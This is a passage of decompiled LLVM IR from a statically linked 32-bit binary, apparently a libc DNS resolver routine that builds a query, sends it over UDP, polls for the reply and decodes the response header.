  %v11_80529cf = icmp slt i32 %v10_80529cf, 0
  %v13_80529cf = icmp slt i32 %v2_80529cf, 0
  %v2_80529d5 = icmp eq i1 %v13_80529cf, %v11_80529cf
  br i1 %v2_80529d5, label %dec_label_pc_8052a0a, label %dec_label_pc_80529d7

dec_label_pc_80529d7:                             ; preds = %dec_label_pc_80529cb
  %v2_80529d7 = add i32 %v0_80529c1, 12
  %v3_80529d7 = inttoptr i32 %v2_80529d7 to i32*
  store i32 %v3_80529c4, i32* %v3_80529d7, align 4
  %v1_80529d8 = add i32 %v0_80529c1, 8
  %v2_80529d8 = inttoptr i32 %v1_80529d8 to i32*
  store i32 1025, i32* %v2_80529d8, align 4
  %v1_80529dd = add i32 %v0_80529c1, 4
  %v2_80529dd = inttoptr i32 %v1_80529dd to i32*
  store i32 ptrtoint (i32* @global_var_805747c.272 to i32), i32* %v2_80529dd, align 4
  %v1_80529e2 = add i32 %v0_80529c1, 28
  %v2_80529e2 = inttoptr i32 %v1_80529e2 to i32*
  %v3_80529e2 = load i32, i32* %v2_80529e2, align 4
  %v6_80529e2 = inttoptr i32 %v0_80529c1 to i32*
  store i32 %v3_80529e2, i32* %v6_80529e2, align 4
  %v0_80529e6 = call i32 @__GI_strncat()
  store i32 %v0_80529e6, i32* %eax.global-to-local, align 4
  %v0_80529eb = load i32, i32* @esp, align 4
  %v1_80529ee = add i32 %v0_80529eb, 8
  %v2_80529ee = inttoptr i32 %v1_80529ee to i32*
  store i32 1025, i32* %v2_80529ee, align 4
  %v1_80529f3 = add i32 %v0_80529eb, 52
  %v2_80529f3 = inttoptr i32 %v1_80529f3 to i32*
  %v3_80529f3 = load i32, i32* %v2_80529f3, align 4
  store i32 %v3_80529f3, i32* %edx.global-to-local, align 4
  %v1_80529f7 = mul i32 %v3_80529f3, 4
  %v2_80529f7 = add i32 %v1_80529f7, 134605656
  %v3_80529f7 = inttoptr i32 %v2_80529f7 to i32*
  %v4_80529f7 = load i32, i32* %v3_80529f7, align 4
  %v6_80529f7 = add i32 %v0_80529eb, 4
  %v7_80529f7 = inttoptr i32 %v6_80529f7 to i32*
  store i32 %v4_80529f7, i32* %v7_80529f7, align 4
  %v1_80529fe = add i32 %v0_80529eb, 28
  %v2_80529fe = inttoptr i32 %v1_80529fe to i32*
  %v3_80529fe = load i32, i32* %v2_80529fe, align 4
  %v6_80529fe = inttoptr i32 %v0_80529eb to i32*
  store i32 %v3_80529fe, i32* %v6_80529fe, align 4
  %v0_8052a02 = call i32 @__GI_strncat()
  store i32 %v0_8052a02, i32* %eax.global-to-local, align 4
  %v0_8052a07 = load i32, i32* @esp, align 4
  %v1_8052a07 = add i32 %v0_8052a07, 16
  br label %dec_label_pc_8052a0a

dec_label_pc_8052a0a:                             ; preds = %dec_label_pc_8052973.dec_label_pc_8052a0a_crit_edge, %dec_label_pc_80529cb, %dec_label_pc_80529d7
  %v1_8052a0a = phi i32 [ %v1_80529c1, %dec_label_pc_8052973.dec_label_pc_8052a0a_crit_edge ], [ %v1_80529c1, %dec_label_pc_80529cb ], [ %v1_8052a07, %dec_label_pc_80529d7 ]
  %v0_8052a0a = phi i32 [ %v0_8052a0a.pre, %dec_label_pc_8052973.dec_label_pc_8052a0a_crit_edge ], [ %v3_80529c4, %dec_label_pc_80529cb ], [ %v0_8052a02, %dec_label_pc_80529d7 ]
  %v2_8052a0a = add i32 %v1_8052a0a, -4
  %v3_8052a0a = inttoptr i32 %v2_8052a0a to i32*
  store i32 %v0_8052a0a, i32* %v3_8052a0a, align 4
  %v0_8052a0b = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a0b = add i32 %v1_8052a0a, -8
  %v3_8052a0b = inttoptr i32 %v2_8052a0b to i32*
  store i32 %v0_8052a0b, i32* %v3_8052a0b, align 4
  %v1_8052a0c = add i32 %v1_8052a0a, -12
  %v2_8052a0c = inttoptr i32 %v1_8052a0c to i32*
  store i32 1, i32* %v2_8052a0c, align 4
  %v1_8052a0e = add i32 %v1_8052a0a, 184
  store i32 %v1_8052a0e, i32* @eax, align 4
  %v2_8052a15 = add i32 %v1_8052a0a, -16
  %v3_8052a15 = inttoptr i32 %v2_8052a15 to i32*
  store i32 %v1_8052a0e, i32* %v3_8052a15, align 4
  %v2_8052a16 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052a16, i32* %eax.global-to-local, align 4
  %v0_8052a1b = load i32, i32* @esp, align 4
  %v1_8052a1b = add i32 %v0_8052a1b, 28
  %v2_8052a1b = inttoptr i32 %v1_8052a1b to i32*
  %v3_8052a1b = load i32, i32* %v2_8052a1b, align 4
  store i32 %v3_8052a1b, i32* %eax.global-to-local, align 4
  %v1_8052a1f = add i32 %v0_8052a1b, 260
  %v2_8052a1f = inttoptr i32 %v1_8052a1f to i32*
  %v3_8052a1f = load i32, i32* %v2_8052a1f, align 4
  store i32 %v3_8052a1f, i32* @edx, align 4
  %v2_8052a26 = add i32 %v0_8052a1b, 216
  %v3_8052a26 = inttoptr i32 %v2_8052a26 to i32*
  store i32 %v3_8052a1b, i32* %v3_8052a26, align 4
  %v0_8052a2d = load i32, i32* @edx, align 4
  %v1_8052a2d = load i32, i32* @esp, align 4
  %v2_8052a2d = add i32 %v1_8052a2d, 220
  %v3_8052a2d = inttoptr i32 %v2_8052a2d to i32*
  store i32 %v0_8052a2d, i32* %v3_8052a2d, align 4
  %v0_8052a34 = load i32, i32* @esp, align 4
  %v1_8052a34 = add i32 %v0_8052a34, 224
  %v2_8052a34 = inttoptr i32 %v1_8052a34 to i32*
  store i32 1, i32* %v2_8052a34, align 4
  %v0_8052a44 = load i32, i32* @esp, align 4
  %v1_8052a47 = load i32, i32* @ebx, align 4
  %v2_8052a47 = sub i32 512, %v1_8052a47
  %v2_8052a49 = add i32 %v0_8052a44, 8
  %v3_8052a49 = inttoptr i32 %v2_8052a49 to i32*
  store i32 %v2_8052a47, i32* %v3_8052a49, align 4
  %v1_8052a4a = load i32, i32* @ebx, align 4
  %v2_8052a4a = add i32 %v1_8052a4a, %v2_8052832
  %v2_8052a4e = add i32 %v0_8052a44, 4
  %v3_8052a4e = inttoptr i32 %v2_8052a4e to i32*
  store i32 %v2_8052a4a, i32* %v3_8052a4e, align 4
  %v1_8052a4f = add i32 %v0_8052a44, 216
  store i32 %v1_8052a4f, i32* @eax, align 4
  %v3_8052a56 = inttoptr i32 %v0_8052a44 to i32*
  store i32 %v1_8052a4f, i32* %v3_8052a56, align 4
  %v0_8052a57 = call i32 @__encode_question()
  store i32 %v0_8052a57, i32* %eax.global-to-local, align 4
  %v0_8052a5c = load i32, i32* @esp, align 4
  store i32 %v0_8052a57, i32* @esi, align 4
  %v2_8052a61 = icmp slt i32 %v0_8052a57, 0
  br i1 %v2_8052a61, label %dec_label_pc_8052ec5, label %dec_label_pc_8052a69

dec_label_pc_8052a69:                             ; preds = %dec_label_pc_8052a0a
  %v1_8052a69 = add i32 %v0_8052a5c, 172
  %v2_8052a69 = inttoptr i32 %v1_8052a69 to i16*
  store i16 2, i16* %v2_8052a69, align 2
  %v1_8052a73 = load i32, i32* @esp, align 4
  %v2_8052a73 = add i32 %v1_8052a73, -4
  %v3_8052a73 = inttoptr i32 %v2_8052a73 to i32*
  store i32 %v0_8052a57, i32* %v3_8052a73, align 4
  %v1_8052a74 = add i32 %v1_8052a73, 164
  store i32 %v1_8052a74, i32* %eax.global-to-local, align 4
  %v2_8052a7b = add i32 %v1_8052a73, -8
  %v3_8052a7b = inttoptr i32 %v2_8052a7b to i32*
  store i32 %v1_8052a74, i32* %v3_8052a7b, align 4
  %v1_8052a7c = add i32 %v1_8052a73, 32
  %v2_8052a7c = inttoptr i32 %v1_8052a7c to i32*
  %v3_8052a7c = load i32, i32* %v2_8052a7c, align 4
  %v5_8052a7c = add i32 %v1_8052a73, -12
  %v6_8052a7c = inttoptr i32 %v5_8052a7c to i32*
  store i32 %v3_8052a7c, i32* %v6_8052a7c, align 4
  %v1_8052a80 = add i32 %v1_8052a73, -16
  %v2_8052a80 = inttoptr i32 %v1_8052a80 to i32*
  store i32 10, i32* %v2_8052a80, align 4
  %v6_8052a82 = call i32 @inet_pton(i32 -1, i8* %v5_8052a82, i32 %v3_805291f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8052a82, i32* %eax.global-to-local, align 4
  %v0_8052a87 = load i32, i32* @esp, align 4
  %v1_8052a87 = add i32 %v0_8052a87, 16
  %tmp47 = icmp slt i32 %v6_8052a82, 1
  br i1 %tmp47, label %dec_label_pc_8052a98, label %dec_label_pc_8052a8e

dec_label_pc_8052a8e:                             ; preds = %dec_label_pc_8052a69
  %v1_8052a8e = add i32 %v0_8052a87, 172
  %v2_8052a8e = inttoptr i32 %v1_8052a8e to i16*
  store i16 10, i16* %v2_8052a8e, align 2
  %v0_8052a98.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052a98

dec_label_pc_8052a98:                             ; preds = %dec_label_pc_8052a69, %dec_label_pc_8052a8e
  %v0_8052aaf = phi i32 [ %v1_8052a87, %dec_label_pc_8052a69 ], [ %v0_8052a98.pre, %dec_label_pc_8052a8e ]
  %v1_8052a98 = add i32 %v0_8052aaf, 156
  %v2_8052a98 = inttoptr i32 %v1_8052a98 to i16*
  %v3_8052a98 = load i16, i16* %v2_8052a98, align 2
  %v12_8052a98 = icmp eq i16 %v3_8052a98, 10
  %v1_8052aa1 = icmp eq i1 %v12_8052a98, false
  %v1_8052aaf = add i32 %v0_8052aaf, 158
  %v2_8052aaf = inttoptr i32 %v1_8052aaf to i16*
  store i16 13568, i16* %v2_8052aaf, align 2
  %v0_8052ab9 = load i32, i32* @esp, align 4
  br i1 %v1_8052aa1, label %dec_label_pc_8052aaf, label %dec_label_pc_8052acf

dec_label_pc_8052aaf:                             ; preds = %dec_label_pc_8052a98
  %v1_8052abc = add i32 %v0_8052ab9, 32
  %v2_8052abc = inttoptr i32 %v1_8052abc to i32*
  %v3_8052abc = load i32, i32* %v2_8052abc, align 4
  %v5_8052abc = add i32 %v0_8052ab9, -16
  %v6_8052abc = inttoptr i32 %v5_8052abc to i32*
  store i32 %v3_8052abc, i32* %v6_8052abc, align 4
  %v1_8052ac0 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8052ac0, i32* %eax.global-to-local, align 4
  %v1_8052ac5 = load i32, i32* @esp, align 4
  %v2_8052ac5 = add i32 %v1_8052ac5, 176
  %v3_8052ac5 = inttoptr i32 %v2_8052ac5 to i32*
  store i32 %v1_8052ac0, i32* %v3_8052ac5, align 4
  %v0_8052acc = load i32, i32* @esp, align 4
  %v1_8052acc = add i32 %v0_8052acc, 16
  br label %dec_label_pc_8052acf

dec_label_pc_8052acf:                             ; preds = %dec_label_pc_8052a98, %dec_label_pc_8052aaf
  %v1_8052acf = phi i32 [ %v1_8052acc, %dec_label_pc_8052aaf ], [ %v0_8052ab9, %dec_label_pc_8052a98 ]
  %v0_8052acf = load i32, i32* @ecx, align 4
  %v2_8052acf = add i32 %v1_8052acf, -4
  %v3_8052acf = inttoptr i32 %v2_8052acf to i32*
  store i32 %v0_8052acf, i32* %v3_8052acf, align 4
  %v1_8052ad0 = add i32 %v1_8052acf, -8
  %v2_8052ad0 = inttoptr i32 %v1_8052ad0 to i32*
  store i32 17, i32* %v2_8052ad0, align 4
  %v1_8052ad2 = add i32 %v1_8052acf, -12
  %v2_8052ad2 = inttoptr i32 %v1_8052ad2 to i32*
  store i32 2, i32* %v2_8052ad2, align 4
  %v1_8052ad4 = add i32 %v1_8052acf, 156
  %v2_8052ad4 = inttoptr i32 %v1_8052ad4 to i16*
  %v3_8052ad4 = load i16, i16* %v2_8052ad4, align 2
  %v4_8052ad4 = zext i16 %v3_8052ad4 to i32
  store i32 %v4_8052ad4, i32* %eax.global-to-local, align 4
  %v2_8052adc = add i32 %v1_8052acf, -16
  %v3_8052adc = inttoptr i32 %v2_8052adc to i32*
  store i32 %v4_8052ad4, i32* %v3_8052adc, align 4
  %v4_8052add = call i32 @socket(i32 -1, i32 %v15_80528c0, i32 %v3_805291f)
  store i32 %v4_8052add, i32* %eax.global-to-local, align 4
  %v1_8052ae2 = load i32, i32* @esp, align 4
  %v2_8052ae2 = add i32 %v1_8052ae2, 36
  %v3_8052ae2 = inttoptr i32 %v2_8052ae2 to i32*
  store i32 %v4_8052add, i32* %v3_8052ae2, align 4
  %v0_8052ae6 = load i32, i32* @esp, align 4
  %v1_8052ae6 = add i32 %v0_8052ae6, 16
  %v0_8052ae9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ae9 = icmp slt i32 %v0_8052ae9, 0
  br i1 %v2_8052ae9, label %dec_label_pc_8052b16, label %dec_label_pc_8052aed

dec_label_pc_8052aed:                             ; preds = %dec_label_pc_8052acf
  %v1_8052aed = add i32 %v0_8052ae6, 172
  store i32 %v1_8052aed, i32* %eax.global-to-local, align 4
  %v0_8052af4 = load i32, i32* @edx, align 4
  %v2_8052af4 = add i32 %v0_8052ae6, 12
  %v3_8052af4 = inttoptr i32 %v2_8052af4 to i32*
  store i32 %v0_8052af4, i32* %v3_8052af4, align 4
  %v1_8052af5 = add i32 %v0_8052ae6, 8
  %v2_8052af5 = inttoptr i32 %v1_8052af5 to i32*
  store i32 28, i32* %v2_8052af5, align 4
  %v0_8052af7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052af7 = add i32 %v0_8052ae6, 4
  %v3_8052af7 = inttoptr i32 %v2_8052af7 to i32*
  store i32 %v0_8052af7, i32* %v3_8052af7, align 4
  %v1_8052af8 = add i32 %v0_8052ae6, 36
  %v2_8052af8 = inttoptr i32 %v1_8052af8 to i32*
  %v3_8052af8 = load i32, i32* %v2_8052af8, align 4
  %v6_8052af8 = inttoptr i32 %v0_8052ae6 to i32*
  store i32 %v3_8052af8, i32* %v6_8052af8, align 4
  %v4_8052afc = call i32 @__libc_connect(i32 -1, i32 %v15_80528c0, i32 %v3_805291f)
  store i32 %v4_8052afc, i32* %eax.global-to-local, align 4
  %v0_8052b01 = load i32, i32* @esp, align 4
  %v2_8052b04 = icmp slt i32 %v4_8052afc, 0
  %v1_8052b06 = icmp eq i1 %v2_8052b04, false
  br i1 %v1_8052b06, label %dec_label_pc_8052b1f, label %dec_label_pc_8052b08

dec_label_pc_8052b08:                             ; preds = %dec_label_pc_8052aed
  %v1_8052b08 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8052b08, i32* %eax.global-to-local, align 4
  %v1_8052b0d = inttoptr i32 %v1_8052b08 to i32*
  %v2_8052b0d = load i32, i32* %v1_8052b0d, align 4
  %v11_8052b0d = icmp eq i32 %v2_8052b0d, 101
  %v0_8052e7f.pre = load i32, i32* @esp, align 4
  br i1 %v11_8052b0d, label %dec_label_pc_8052e7f, label %dec_label_pc_8052b16

dec_label_pc_8052b16:                             ; preds = %dec_label_pc_8052b08, %dec_label_pc_8052acf
  %v17_8052b16 = phi i32 [ %v1_8052ae6, %dec_label_pc_8052acf ], [ %v0_8052e7f.pre, %dec_label_pc_8052b08 ]
  %v1_8052b16 = add i32 %v17_8052b16, 28
  %v2_8052b16 = inttoptr i32 %v1_8052b16 to i32*
  %v3_8052b16 = load i32, i32* %v2_8052b16, align 4
  %v4_8052b16 = add i32 %v3_8052b16, 1
  store i32 %v4_8052b16, i32* %v2_8052b16, align 4
  br label %dec_label_pc_8052ea0.backedge

dec_label_pc_8052b1f:                             ; preds = %dec_label_pc_8052aed
  %v0_8052b1f = load i32, i32* @ebx, align 4
  %v1_8052b1f = load i32, i32* @esi, align 4
  %v2_8052b1f = add i32 %v1_8052b1f, %v0_8052b1f
  store i32 %v2_8052b1f, i32* %eax.global-to-local, align 4
  %v1_8052b22 = add i32 %v0_8052b01, 12
  %v2_8052b22 = inttoptr i32 %v1_8052b22 to i32*
  store i32 0, i32* %v2_8052b22, align 4
  %v0_8052b24 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b24 = add i32 %v0_8052b01, 8
  %v3_8052b24 = inttoptr i32 %v2_8052b24 to i32*
  store i32 %v0_8052b24, i32* %v3_8052b24, align 4
  %v2_8052b25 = add i32 %v0_8052b01, 4
  %v3_8052b25 = inttoptr i32 %v2_8052b25 to i32*
  store i32 %v2_8052832, i32* %v3_8052b25, align 4
  %v1_8052b26 = add i32 %v0_8052b01, 36
  %v2_8052b26 = inttoptr i32 %v1_8052b26 to i32*
  %v3_8052b26 = load i32, i32* %v2_8052b26, align 4
  %v6_8052b26 = inttoptr i32 %v0_8052b01 to i32*
  store i32 %v3_8052b26, i32* %v6_8052b26, align 4
  %v5_8052b2a = call i32 @__libc_send(i32 -1, i32 %v15_80528c0, i32 %v3_805291f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052b2a, i32* %eax.global-to-local, align 4
  %v0_8052b2f = load i32, i32* @esp, align 4
  %v1_8052b2f = add i32 %v0_8052b2f, 36
  %v2_8052b2f = inttoptr i32 %v1_8052b2f to i32*
  %v3_8052b2f = load i32, i32* %v2_8052b2f, align 4
  %v2_8052b33 = add i32 %v0_8052b2f, 228
  %v3_8052b33 = inttoptr i32 %v2_8052b33 to i32*
  store i32 %v3_8052b2f, i32* %v3_8052b33, align 4
  %v0_8052b3a = load i32, i32* @esp, align 4
  %v1_8052b3a = add i32 %v0_8052b3a, 232
  %v2_8052b3a = inttoptr i32 %v1_8052b3a to i16*
  store i16 1, i16* %v2_8052b3a, align 2
  %v0_8052b44 = load i32, i32* @esp, align 4
  %v1_8052b47 = add i32 %v0_8052b44, 8
  %v2_8052b47 = inttoptr i32 %v1_8052b47 to i32*
  store i32 10000, i32* %v2_8052b47, align 4
  %v1_8052b4c = add i32 %v0_8052b44, 4
  %v2_8052b4c = inttoptr i32 %v1_8052b4c to i32*
  store i32 1, i32* %v2_8052b4c, align 4
  %v1_8052b4e = add i32 %v0_8052b44, 228
  store i32 %v1_8052b4e, i32* %eax.global-to-local, align 4
  %v3_8052b55 = inttoptr i32 %v0_8052b44 to i32*
  store i32 %v1_8052b4e, i32* %v3_8052b55, align 4
  %v0_8052b56 = call i32 @__libc_poll()
  store i32 %v0_8052b56, i32* %eax.global-to-local, align 4
  %v0_8052b5b = load i32, i32* @esp, align 4
  %v1_8052b5b = add i32 %v0_8052b5b, 16
  %tmp48 = icmp slt i32 %v0_8052b56, 1
  br i1 %tmp48, label %dec_label_pc_8052e7f, label %dec_label_pc_8052b66

dec_label_pc_8052b66:                             ; preds = %dec_label_pc_8052b1f
  %v1_8052b66 = add i32 %v0_8052b5b, 12
  %v2_8052b66 = inttoptr i32 %v1_8052b66 to i32*
  store i32 0, i32* %v2_8052b66, align 4
  %v1_8052b68 = add i32 %v0_8052b5b, 8
  %v2_8052b68 = inttoptr i32 %v1_8052b68 to i32*
  store i32 512, i32* %v2_8052b68, align 4
  %v2_8052b6d = add i32 %v0_8052b5b, 4
  %v3_8052b6d = inttoptr i32 %v2_8052b6d to i32*
  store i32 %v2_8052832, i32* %v3_8052b6d, align 4
  %v1_8052b6e = add i32 %v0_8052b5b, 36
  %v2_8052b6e = inttoptr i32 %v1_8052b6e to i32*
  %v3_8052b6e = load i32, i32* %v2_8052b6e, align 4
  %v6_8052b6e = inttoptr i32 %v0_8052b5b to i32*
  store i32 %v3_8052b6e, i32* %v6_8052b6e, align 4
  %v5_8052b72 = call i32 @__libc_recv(i32 -1, i32 %v15_80528c0, i32 %v3_805291f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052b72, i32* @eax, align 4
  %v1_8052b77 = load i32, i32* @esp, align 4
  %v2_8052b77 = add i32 %v1_8052b77, 32
  %v3_8052b77 = inttoptr i32 %v2_8052b77 to i32*
  store i32 %v5_8052b72, i32* %v3_8052b77, align 4
  %v0_8052b7b = load i32, i32* @esp, align 4
  %v1_8052b7b = add i32 %v0_8052b7b, 16
  %v7_8052b81 = icmp sgt i32 %v5_8052b72, 11
  br i1 %v7_8052b81, label %dec_label_pc_8052b87, label %dec_label_pc_8052e34

dec_label_pc_8052b87:                             ; preds = %dec_label_pc_8052b66
  %v0_8052b87 = load i32, i32* @ebx, align 4
  %v2_8052b87 = add i32 %v0_8052b7b, 12
  %v3_8052b87 = inttoptr i32 %v2_8052b87 to i32*
  store i32 %v0_8052b87, i32* %v3_8052b87, align 4
  %v0_8052b88 = load i32, i32* @ebx, align 4
  %v2_8052b88 = add i32 %v0_8052b7b, 8
  %v3_8052b88 = inttoptr i32 %v2_8052b88 to i32*
  store i32 %v0_8052b88, i32* %v3_8052b88, align 4
  %v1_8052b89 = add i32 %v0_8052b7b, 84
  store i32 %v1_8052b89, i32* %eax.global-to-local, align 4
  %v2_8052b8d = add i32 %v0_8052b7b, 4
  %v3_8052b8d = inttoptr i32 %v2_8052b8d to i32*
  store i32 %v1_8052b89, i32* %v3_8052b8d, align 4
  %v3_8052b8e = inttoptr i32 %v0_8052b7b to i32*
  store i32 %v2_8052832, i32* %v3_8052b8e, align 4
  %v0_8052b8f = call i32 @__decode_header()
  store i32 %v0_8052b8f, i32* %eax.global-to-local, align 4
  %v0_8052b94 = load i32, i32* @esp, align 4
  %v1_8052b94 = add i32 %v0_8052b94, 84
  %v2_8052b94 = inttoptr i32 %v1_8052b94 to i32*
  %v3_8052b94 = load i32, i32* %v2_8052b94, align 4
  store i32 %v3_8052b94, i32* %edx.global-to-local, align 4
  %v2_8052b98 = add i32 %v0_8052b94, 72
  %v3_8052b98 = inttoptr i32 %v2_8052b98 to i32*
  store i32 %v3_8052b94, i32* %v3_8052b98, align 4
  %v0_8052b9c = load i32, i32* @esp, align 4
  %v1_8052b9c = add i32 %v0_8052b9c, 16
  %v1_8052b9f = add i32 %v0_8052b9c, 60
  %v2_8052b9f = inttoptr i32 %v1_8052b9f to i32*
  %v3_8052b9f = load i32, i32* %v2_8052b9f, align 4
  store i32 %v3_8052b9f, i32* @eax, align 4
  %v0_8052ba3 = load i32, i32* %edx.global-to-local, align 4
  %v12_8052ba3 = icmp eq i32 %v0_8052ba3, %v3_8052b9f
  %v1_8052ba5 = icmp eq i1 %v12_8052ba3, false
  br i1 %v1_8052ba5, label %dec_label_pc_8052e34, label %dec_label_pc_8052bab

dec_label_pc_8052bab:                             ; preds = %dec_label_pc_8052b87
  %v1_8052bab = add i32 %v0_8052b9c, 88
  %v2_8052bab = inttoptr i32 %v1_8052bab to i32*
  %v3_8052bab = load i32, i32* %v2_8052bab, align 4
  %v4_8052bab = icmp eq i32 %v3_8052bab, 0
  br i1 %v4_8052bab, label %dec_label_pc_8052e34, label %dec_label_pc_8052bb6

dec_label_pc_8052bb6:                             ; preds = %dec_label_pc_8052bab
  %v1_8052bb6 = add i32 %v0_8052b9c, 112
  %v2_8052bb6 = inttoptr i32 %v1_8052bb6 to i32*
  %v3_8052bb6 = load i32, i32* %v2_8052bb6, align 4
  store i32 %v3_8052bb6, i32* @eax, align 4
  %v9_8052bba = icmp eq i32 %v3_8052bb6, 3
  %v1_8052bbd = icmp eq i1 %v9_8052bba, false
  br i1 %v1_8052bbd, label %dec_label_pc_8052c25, label %dec_label_pc_8052bbf

dec_label_pc_8052bbf:                             ; preds = %dec_label_pc_8052bb6
  %v1_8052bbf = add i32 %v0_8052b9c, 67
  %v2_8052bbf = inttoptr i32 %v1_8052bbf to i8*
  %v3_8052bbf = load i8, i8* %v2_8052bbf, align 1
  %v4_8052bbf = icmp eq i8 %v3_8052bbf, 0
  %v1_8052bc4 = icmp eq i1 %v4_8052bbf, false
  br i1 %v1_8052bc4, label %dec_label_pc_8052c15, label %dec_label_pc_8052bc6

dec_label_pc_8052bc6:                             ; preds = %dec_label_pc_8052bbf
  %v0_8052bc6 = load i32, i32* @ecx, align 4
  %v2_8052bc6 = add i32 %v0_8052b9c, 12
  %v3_8052bc6 = inttoptr i32 %v2_8052bc6 to i32*
  store i32 %v0_8052bc6, i32* %v3_8052bc6, align 4
  %v1_8052bc7 = add i32 %v0_8052b9c, 8
  %v2_8052bc7 = inttoptr i32 %v1_8052bc7 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %v2_8052bc7, align 4
  %v1_8052bcc = add i32 %v0_8052b9c, 4
  %v2_8052bcc = inttoptr i32 %v1_8052bcc to i32*
  store i32 134550743, i32* %v2_8052bcc, align 4
  %v1_8052bd1 = add i32 %v0_8052b9c, 200
  store i32 %v1_8052bd1, i32* @esi, align 4
  %v3_8052bd8 = inttoptr i32 %v0_8052b9c to i32*
  store i32 %v1_8052bd1, i32* %v3_8052bd8, align 4
  %v2_8052bd9 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052bd9, i32* %eax.global-to-local, align 4
  %v0_8052bde = load i32, i32* @esp, align 4
  %v1_8052bde = inttoptr i32 %v0_8052bde to i32*
  store i32 ptrtoint (i32* @global_var_8058488.210 to i32), i32* %v1_8052bde, align 4
  %v1_8052be5 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052be5, i32* %eax.global-to-local, align 4
  %v0_8052bea = load i32, i32* @esp, align 4
  %v1_8052bea = inttoptr i32 %v0_8052bea to i32*
  %v2_8052bea = load i32, i32* %v1_8052bea, align 4
  store i32 %v2_8052bea, i32* @eax, align 4
  %v3_8052bea = add i32 %v0_8052bea, 4
  %v1_8052beb = inttoptr i32 %v3_8052bea to i32*
  %v2_8052beb = load i32, i32* %v1_8052beb, align 4
  store i32 %v2_8052beb, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052beb, align 4
  %v0_8052bee = load i32, i32* @esi, align 4
  store i32 %v0_8052bee, i32* %v1_8052bea, align 4
  %v0_8052bef = load i32, i32* @global_var_805eb78.271, align 8
  store i32 %v0_8052bef, i32* %ebx.global-to-local, align 4
  %v2_8052bf5 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052bf5, i32* %eax.global-to-local, align 4
  %v0_8052bfa = load i32, i32* @esp, align 4
  %v1_8052bfd = add i32 %v0_8052bef, -1
  store i32 %v1_8052bfd, i32* @ebx, align 4
  %v1_8052bfe = add i32 %v0_8052bfa, 52
  %v2_8052bfe = inttoptr i32 %v1_8052bfe to i32*
  %v3_8052bfe = load i32, i32* %v2_8052bfe, align 4
  %v5_8052bfe = sub i32 %v3_8052bfe, %v1_8052bfd
  %v11_8052bfe = xor i32 %v3_8052bfe, %v1_8052bfd
  %v12_8052bfe = xor i32 %v5_8052bfe, %v3_8052bfe
  %v13_8052bfe = and i32 %v12_8052bfe, %v11_8052bfe
  %v14_8052bfe = icmp slt i32 %v13_8052bfe, 0
  %v16_8052bfe = icmp slt i32 %v5_8052bfe, 0
  %v2_8052c02 = icmp eq i1 %v16_8052bfe, %v14_8052bfe
  br i1 %v2_8052c02, label %dec_label_pc_8052c15, label %dec_label_pc_8052c04

dec_label_pc_8052c04:                             ; preds = %dec_label_pc_8052bc6
  %v4_8052c04 = add i32 %v3_8052bfe, 1
  store i32 %v4_8052c04, i32* %v2_8052bfe, align 4
  %v0_8052c08 = load i32, i32* @esp, align 4
  %v1_8052c08 = add i32 %v0_8052c08, 56
  %v2_8052c08 = inttoptr i32 %v1_8052c08 to i32*
  %v3_8052c08 = load i32, i32* %v2_8052c08, align 4
  store i32 %v3_8052c08, i32* %edx.global-to-local, align 4
  %v2_8052c0c = add i32 %v0_8052c08, 44
  %v3_8052c0c = inttoptr i32 %v2_8052c0c to i32*
  store i32 %v3_8052c08, i32* %v3_8052c0c, align 4
  br label %dec_label_pc_8052ea0.backedge

dec_label_pc_8052c15:                             ; preds = %dec_label_pc_8052bc6, %dec_label_pc_8052bbf
  %v0_8052c15 = call i32 @__GI___h_errno_location()
  store i32 %v0_8052c15, i32* %eax.global-to-local, align 4
  %v1_8052c1a = inttoptr i32 %v0_8052c15 to i32*
  store i32 1, i32* %v1_8052c1a, align 4
  br label %dec_label_pc_8052ed8

dec_label_pc_8052c25:                             ; preds = %dec_label_pc_8052bb6
  %v1_8052c25 = icmp eq i32 %v3_8052bb6, 0
  %v1_8052c27 = icmp eq i1 %v1_8052c25, false
  br i1 %v1_8052c27, label %dec_label_pc_8052e34, label %dec_label_pc_8052c2d

dec_label_pc_8052c2d:                             ; preds = %dec_label_pc_8052c25
  %v1_8052c2d = add i32 %v0_8052b9c, 120
  %v2_8052c2d = inttoptr i32 %v1_8052c2d to i32*
  %v3_8052c2d = load i32, i32* %v2_8052c2d, align 4
  %tmp49 = icmp slt i32 %v3_8052c2d, 1
  br i1 %tmp49, label %dec_label_pc_8052c3d, label %dec_label_pc_8052c34

dec_label_pc_8052c34:                             ; preds = %dec_label_pc_8052c2d
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8052c5c55 = add i32 %v0_8052b9c, 116
  %v3_8052c5c56 = inttoptr i32 %v2_8052c5c55 to i32*
  %v4_8052c5c57 = load i32, i32* %v3_8052c5c56, align 4
  %v5_8052c5c58 = sub i32 0, %v4_8052c5c57
  %v13_8052c5c62 = and i32 %v4_8052c5c57, %v5_8052c5c58
  %v14_8052c5c63 = icmp slt i32 %v13_8052c5c62, 0
  %v16_8052c5c65 = icmp slt i32 %v5_8052c5c58, 0
  %v2_8052c6066 = icmp eq i1 %v16_8052c5c65, %v14_8052c5c63
  br i1 %v2_8052c6066, label %dec_label_pc_8052c62, label %dec_label_pc_8052c4d

dec_label_pc_8052c3d:                             ; preds = %dec_label_pc_8052c2d
  %v0_8052c3d = call i32 @__GI___h_errno_location()
  store i32 %v0_8052c3d, i32* %eax.global-to-local, align 4
  %v1_8052c42 = inttoptr i32 %v0_8052c3d to i32*
  store i32 4, i32* %v1_8052c42, align 4
  br label %dec_label_pc_8052ed8

